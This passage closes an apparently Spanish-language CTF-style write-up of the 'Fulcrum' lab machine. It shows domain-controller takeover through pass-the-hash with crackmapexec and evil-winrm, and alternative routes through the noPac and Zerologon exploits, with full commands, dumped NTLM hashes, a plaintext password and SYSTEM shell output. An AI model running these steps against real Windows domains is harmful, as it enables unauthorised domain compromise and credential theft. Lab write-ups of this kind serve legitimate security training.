</span><span class="az">SMB         </span><span class="p">dc.fulcrum.local 445    DC               </span><span class="am">ldap:1103:aad3b435b51404eeaad3b435b51404ee:a97c08ac07aa5f9a2fd85c8557cb5934:::
</span><span class="az">SMB         </span><span class="p">dc.fulcrum.local 445    DC               </span><span class="am">923a:1104:aad3b435b51404eeaad3b435b51404ee:57cecc4c6320e7a5739ef24ea54ae6b4:::
</span><span class="az">SMB         </span><span class="p">dc.fulcrum.local 445    DC               </span><span class="am">BTables:1105:aad3b435b51404eeaad3b435b51404ee:35f6c3ebbd5fb321ab9b312177ac63cf:::
</span><span class="az">SMB         </span><span class="p">dc.fulcrum.local 445    DC               </span><span class="am">DC$:1000:aad3b435b51404eeaad3b435b51404ee:d1c6ccdaaf3c22126e7f9f49a5b8ecec:::
</span><span class="az">SMB         </span><span class="p">dc.fulcrum.local 445    DC               </span><span class="am">FILE$:1106:aad3b435b51404eeaad3b435b51404ee:7d766e4328b3a15d562ea8f319b34788:::</span>
</code></pre></div></div><br>

<p class="plain-text">Usando este <code class="language-plaintext highlighter-rouge">hash</code> ya que el usuario es administrador del dominio podemos ejecutar comandos en cualquiera de los equipos como el usuario <code class="language-plaintext highlighter-rouge">Administrator</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ proxychains</span><span class="p"> -q crackmapexec winrm 192.168.122.130-132 -u Administrator -H 17ac19e99e0d2140a9162c97414ceb43 -d fulcrum.local -x whoami  
</span><span class="az">HTTP        </span><span class="p">dc.fulcrum.local   5985   DC             </span><span class="az">[*] </span><span class="p">http://dc.fulcrum.local:5985/wsman
</span><span class="az">WINRM       </span><span class="p">dc.fulcrum.local   5985   DC             </span><span class="ve">[+] </span><span class="p">fulcrum.local\Administrator:17ac19e99e0d2140a9162c97414ceb43 </span><span class="am">(Pwn3d!)
</span><span class="az">WINRM       </span><span class="p">dc.fulcrum.local   5985   DC             </span><span class="ve">[+] </span><span class="p">Executed command
</span><span class="az">WINRM       </span><span class="p">dc.fulcrum.local   5985   DC             </span><span class="am">fulcrum\administrator
</span><span class="az">HTTP        </span><span class="p">file.fulcrum.local 5985   FILE           </span><span class="az">[*] </span><span class="p">http://file.fulcrum.local:5985/wsman
</span><span class="az">WINRM       </span><span class="p">file.fulcrum.local 5985   FILE           </span><span class="ve">[+] </span><span class="p">fulcrum.local\Administrator:17ac19e99e0d2140a9162c97414ceb43 </span><span class="am">(Pwn3d!)
</span><span class="az">WINRM       </span><span class="p">file.fulcrum.local 5985   FILE           </span><span class="ve">[+] </span><span class="p">Executed command
</span><span class="az">WINRM       </span><span class="p">file.fulcrum.local 5985   FILE           </span><span class="am">fulcrum\administrator</span>
</code></pre></div></div><br>

<p class="plain-text">Nuevamente nos conectamos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> pero esta vez como <code class="language-plaintext highlighter-rouge">Administrator</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ proxychains </span><span class="p">-q evil-winrm -i dc.fulcrum.local -u Administrator -H 17ac19e99e0d2140a9162c97414ceb43  
PS C:\Users\Administrator\Documents> </span><span class="am">whoami</span><span class="p">
fulcrum\administrator
PS C:\Users\Administrator\Documents> </span><span class="am">type </span><span class="p">..\Desktop\root.txt
8dd**************************cab
PS C:\Users\Administrator\Documents></span>
</code></pre></div></div><br>

</section>
<section class="post" id="extra1-administrator">
<br><h3 class="post-title">Extra 1 - Administrator</h3><br>

<p class="plain-text">Como alternativa podemos usar <a href="https://github.com/Ridter/noPac">noPac</a>, al explotarlo indicando el parametro <code class="language-plaintext highlighter-rouge">-shell</code> nos otorgara una cmd como el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code> directamente en el <code class="language-plaintext highlighter-rouge">DC</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ proxychains </span><span class="p">-q python3 noPac.py fulcrum.local/BTables:++FileServerLogon12345++ -use-ldap -shell -dc-ip 192.168.122.130  

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
    
[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target dc.fulcrum.local
[*] Total Domain Admins 2
[*] will try to impersonate Administrator
[*] Adding Computer Account "WIN-N0JHJWWMXPH$"
[*] MachineAccount "WIN-N0JHJWWMXPH$" password = DeDK5PKgLW3Y
[*] Successfully added machine account WIN-N0JHJWWMXPH$ with password DeDK5PKgLW3Y.
[*] WIN-N0JHJWWMXPH$ object = CN=WIN-N0JHJWWMXPH,CN=Computers,DC=fulcrum,DC=local
[*] WIN-N0JHJWWMXPH$ sAMAccountName == dc
[*] Saving a DC's ticket in dc.ccache
[*] Reseting the machine account to WIN-N0JHJWWMXPH$
[*] Restored WIN-N0JHJWWMXPH$ sAMAccountName to original value
[*] Using TGT from cache
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] Saving a user's ticket in Administrator.ccache
[*] Rename ccache to Administrator_dc.fulcrum.local.ccache
[*] Attempting to del a computer with the name: WIN-N0JHJWWMXPH$
[-] Delete computer WIN-N0JHJWWMXPH$ Failed! Maybe the current user does not have permission.
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[!] Launching semi-interactive shell - Careful what you execute

C:\Windows\system32></span><span class="am">whoami</span><span class="p">
nt authority\system

C:\Windows\system32></span><span class="am">hostname</span><span class="p">
DC

C:\Windows\system32></span>
</code></pre></div></div><br>

</section>
<section class="post" id="extra2-administrator">
<br><h3 class="post-title">Extra 2 - Administrator</h3><br>

<p class="plain-text">Como alternativa podemos ejecutar la vuln de <a href="https://github.com/dirkjanm/CVE-2020-1472">zerologon</a> hacia el DC, el servidor es vulnerable y logramos cambiar la <code class="language-plaintext highlighter-rouge">contraseña</code> del equipo por una cadena vacia</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ proxychains </span><span class="p">-q python3 cve-2020-1472-exploit.py DC 192.168.122.130
Performing authentication attempts...
==========================================================================  
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete!</span>
</code></pre></div></div><br>

<p class="plain-text">Autenticandonos como el propio equipo <code class="language-plaintext highlighter-rouge">DC$</code> con una cadena vacia como contraseña podemos hacer un <code class="language-plaintext highlighter-rouge">DCSync</code> y ver los hashes NT de todos los usuarios del dominio</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ proxychains </span><span class="p">-q crackmapexec smb dc.fulcrum.local -u DC$ -p</span><span class="am"> '' </span><span class="p">--ntds drsuapi
</span><span class="az">SMB         </span><span class="p">dc.fulcrum.local 445    DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC) (domain:fulcrum.local) (signing:True) (SMBv1:False)  
</span><span class="az">SMB         </span><span class="p">dc.fulcrum.local 445    DC               </span><span class="ve">[+] </span><span class="p">fulcrum.local\DC$: 
</span><span class="az">SMB         </span><span class="p">dc.fulcrum.local 445    DC               </span><span class="ro">[-] </span><span class="p">RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
</span><span class="az">SMB         </span><span class="p">dc.fulcrum.local 445    DC               </span><span class="ve">[+] </span><span class="p">Dumping the NTDS, this could take a while so go grab a redbull...
</span><span class="az">SMB         </span><span class="p">dc.fulcrum.local 445    DC               </span><span class="am">Administrator:500:aad3b435b51404eeaad3b435b51404ee:17ac19e99e0d2140a9162c97414ceb43:::
</span><span class="az">SMB         </span><span class="p">dc.fulcrum.local 445    DC               </span><span class="am">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span><span class="az">SMB         </span><span class="p">dc.fulcrum.local 445    DC               </span><span class="am">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:30dd0b7d7f91ca7b1ec413871f095c64:::
</span><span class="az">SMB         </span><span class="p">dc.fulcrum.local 445    DC               </span><span class="am">ldap:1103:aad3b435b51404eeaad3b435b51404ee:a97c08ac07aa5f9a2fd85c8557cb5934:::
</span><span class="az">SMB         </span><span class="p">dc.fulcrum.local 445    DC               </span><span class="am">923a:1104:aad3b435b51404eeaad3b435b51404ee:57cecc4c6320e7a5739ef24ea54ae6b4:::
</span><span class="az">SMB         </span><span class="p">dc.fulcrum.local 445    DC               </span><span class="am">BTables:1105:aad3b435b51404eeaad3b435b51404ee:35f6c3ebbd5fb321ab9b312177ac63cf:::
</span><span class="az">SMB         </span><span class="p">dc.fulcrum.local 445    DC               </span><span class="am">DC$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span><span class="az">SMB         </span><span class="p">dc.fulcrum.local 445    DC               </span><span class="am">FILE$:1106:aad3b435b51404eeaad3b435b51404ee:63e803f4a9c87acfd3e7648bf414e014:::</span>
</code></pre></div></div><br>

<p class="plain-text">Simplemente nos conectamos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> como el usuario <code class="language-plaintext highlighter-rouge">Administrator</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ proxychains </span><span class="p">-q evil-winrm -i dc.fulcrum.local -u Administrator -H 17ac19e99e0d2140a9162c97414ceb43  
PS C:\Users\Administrator\Documents> </span><span class="am">whoami</span><span class="p">
fulcrum\administrator
PS C:\Users\Administrator\Documents> </span><span class="am">type </span><span class="p">..\Desktop\root.txt
8dd**************************cab
PS C:\Users\Administrator\Documents></span>
</code></pre></div></div><br>
</section>

</article>
  </div>
  <footer class="footer">
    <span class="footer__copyright">&copy; 2024 - DarthBear</span>
  </footer><br><br>

<script type="text/javascript" src="/js/jquery.min.js"></script>
<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>

    </div>
  </body>
</html>
